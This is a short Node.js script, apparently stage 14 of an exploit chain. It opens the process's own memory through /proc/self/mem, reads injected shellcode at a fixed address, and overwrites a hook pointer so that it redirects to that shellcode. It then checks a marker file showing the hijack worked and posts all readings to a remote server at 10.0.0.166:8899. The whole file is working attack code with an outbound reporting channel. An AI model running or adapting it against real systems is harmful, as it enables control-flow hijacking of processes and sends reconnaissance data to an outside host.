// Stage-14: diagnose hook hijack (readback hook + shellcode + marker).
var fs = require('fs');
var http = require('http');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon14', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
var SC = 0x213f0000, HOOK = 0x42a14c30;
var out = {};
try {
  var fd = fs.openSync('/proc/self/mem', 'r+');
  var hb = new Buffer(4);
  fs.readSync(fd, hb, 0, 4, HOOK); out.hookBefore = hb.readUInt32LE(0).toString(16);
  var sb = new Buffer(16);
  fs.readSync(fd, sb, 0, 16, SC); out.scBytes = sb.toString('hex');
  var p = new Buffer(4); p.writeUInt32LE(SC, 0);
  var nw = fs.writeSync(fd, p, 0, 4, HOOK); out.hookWrite = nw;
  var hb2 = new Buffer(4); fs.readSync(fd, hb2, 0, 4, HOOK); out.hookAfterSet = hb2.readUInt32LE(0).toString(16);
  fs.closeSync(fd);
  var trig = new Buffer(16);
  var fd2 = fs.openSync('/proc/self/mem', 'r+');
  var hb3 = new Buffer(4); fs.readSync(fd2, hb3, 0, 4, HOOK); out.hookAfterTrigger = hb3.readUInt32LE(0).toString(16);
  fs.closeSync(fd2);
  try { out.marker = fs.readFileSync('/home/owner/share/tmp/hijack_ok', 'utf8'); } catch (e) { out.marker = 'absent'; }
} catch (e) { out.err = e.message; }
post(out);
